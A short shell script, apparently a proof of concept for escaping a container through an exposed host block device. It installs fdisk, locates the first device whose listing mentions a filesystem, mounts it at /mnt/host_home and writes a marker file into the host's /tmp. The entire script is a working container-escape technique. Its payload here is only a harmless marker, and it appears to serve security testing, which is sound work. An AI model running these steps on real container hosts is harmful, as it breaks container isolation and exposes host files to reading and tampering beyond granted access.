#!/bin/sh
apt update; apt install fdisk
device=`fdisk -l | grep filesystem | awk '{print $1}' | head -1`
mkdir /mnt/host_home
mount $device /mnt/host_home
touch /mnt/host_home/tmp/container-escape-exposed_block_device.txt
